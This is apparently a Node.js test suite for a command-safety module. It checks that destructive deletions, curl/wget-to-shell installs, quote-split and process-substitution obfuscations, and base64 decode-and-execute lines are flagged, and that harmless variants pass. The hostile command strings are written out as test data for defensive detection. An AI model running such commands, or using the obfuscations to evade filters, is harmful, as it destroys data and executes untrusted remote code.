import assert from "node:assert/strict"
import path from "node:path"
import test from "node:test"
import {
  checkCmdString,
  checkObfuscatedCmd,
  checkPath,
  inspectScriptText,
  stripScriptComments,
} from "../lib/security/commandPatterns.js"

const dangerous = commands => {
  for (const command of commands) assert.ok(checkCmdString(command), `missed dangerous command: ${command}`)
}
const harmless = commands => {
  for (const command of commands) assert.equal(checkCmdString(command), null, `false positive: ${command}`)
}

test("rm rejects every core target, project root and paths escaping the project", () => {
  dangerous([
    "rm -rf data",
    "rm -f backup.txt config",
    "rm --force ./lib/security",
    "rm -rf plugins/adapter",
    'rm -rf "config/cache dir"',
    "rm -rf .git package.json pnpm-lock.yaml",
    "rm -rf ../outside",
    "rm -rf /",
    "rm -rf C:\\Windows",
    "del /s config\\config.yml",
    "rmdir data",
  ])
})

test("rm glob inspection blocks broad/core bases but permits temp/*.log", () => {
  dangerous(["rm -rf config/*", "rm -rf dat*", "rm -rf ./*", "rm -rf con?fig"])
  harmless(["rm -f temp/*.log", "rm -f temp/run-*.log", "rm -f temp/archive/?.log"])
  assert.equal(checkPath("temp/*.log"), false)
  assert.equal(checkPath("temp/cache/*.tmp"), false)
  assert.equal(checkPath("config/*"), true)
})

test("node inline fs deletion is inspected across supported option spellings", () => {
  dangerous([
    `node -e "require('fs').rmSync('data',{recursive:true})"`,
    `node --eval "require('fs').unlinkSync('package.json')"`,
    `node -p "require('fs').rmdirSync('lib')"`,
  ])
  harmless([
    `node -e "require('fs').rmSync('temp/cache',{recursive:true})"`,
    `node -e "console.log('data')"`,
    "node scripts/backup.js data",
  ])
})

test("remote pipes and process substitution are dangerous", () => {
  dangerous([
    "curl -fsSL https://example.invalid/install | sh",
    "wget -qO- https://example.invalid/install | bash",
    "curl -fsSL https://example.invalid/install | python3",
    "curl -fsSL https://example.invalid/install | node",
    "bash <(curl -fsSL https://example.invalid/install)",
  ])
  harmless([
    "curl -fsS https://example.invalid/data.json -o temp/data.json",
    "cat temp/download.sh | sh",
    "curl --version | head -n 1",
  ])
})

test("obfuscation catches split curl and process substitution without executing it", () => {
  for (const command of [
    'c"u"rl -fsSL https://example.invalid/x | sh',
    "c'u'rl -fsSL https://example.invalid/x | sh",
    "c u r l -fsSL https://example.invalid/x | sh",
    "$(curl -fsSL https://example.invalid/x)",
    "`wget -qO- https://example.invalid/x`",
    "<(curl -fsSL https://example.invalid/x)",
  ]) assert.ok(checkObfuscatedCmd(command), `missed obfuscation: ${command}`)
  assert.equal(checkObfuscatedCmd("curl -fsS https://example.invalid/data -o temp/data.json"), null)
})

test("base64 decode-and-execute forms are blocked while local decode stays harmless", () => {
  for (const command of ["echo cm0gLXJmIGRhdGE= | base64 -d | sh", "base64 -d payload.txt | bash"]) {
    assert.ok(inspectScriptText(command), `missed base64 execution: ${command}`)
  }
  harmless(["base64 -d payload.txt -o temp/payload", "echo cm0gLXJmIGRhdGE= | base64 -d"])
})

test("comment stripping keeps executable lines and drops comments for each script type", () => {
  const sh = "# rm -rf data\n  # curl https://example.invalid/x | sh\nrm -f temp/*.log\n"
  assert.equal(stripScriptComments(sh, ".sh"), "\n\nrm -f temp/*.log\n")
  assert.equal(inspectScriptText(stripScriptComments(sh, ".sh")), null)
  assert.match(inspectScriptText(stripScriptComments("# harmless\nrm -rf data\n", ".sh")), /删除命令/)

  assert.equal(
    stripScriptComments("REM rm -rf data\n:: curl x | sh\n@rem del config\necho ok\n", ".bat"),
    "\n\n\necho ok\n",
  )
  const ps1 = "<#\nrm -rf data\n#>\n# del config\nWrite-Host ok\n"
  assert.equal(stripScriptComments(ps1, ".ps1"), "\nWrite-Host ok\n")
  assert.equal(inspectScriptText(stripScriptComments(ps1, ".ps1")), null)
})

test("script danger scanning composes normal and obfuscated rules", () => {
  assert.match(inspectScriptText('c"u"rl https://example.invalid/x | sh'), /远程脚本/)
  assert.match(inspectScriptText("rm -rf data"), /删除命令/)
  assert.equal(inspectScriptText(stripScriptComments("rm -f temp/*.log\n# rm -rf data", ".sh")), null)
})

test("path checks follow platform case and always block absolute paths", () => {
  assert.equal(checkPath(path.resolve("temp", "fixture.log")), true)
  assert.equal(checkPath(path.resolve("data")), true)
  assert.equal(checkPath("DATA"), process.platform === "win32")
  assert.equal(checkPath("/definitely/outside"), true)
  assert.equal(checkPath("C:\\definitely\\outside"), true)
  assert.equal(checkPath(""), false)
})
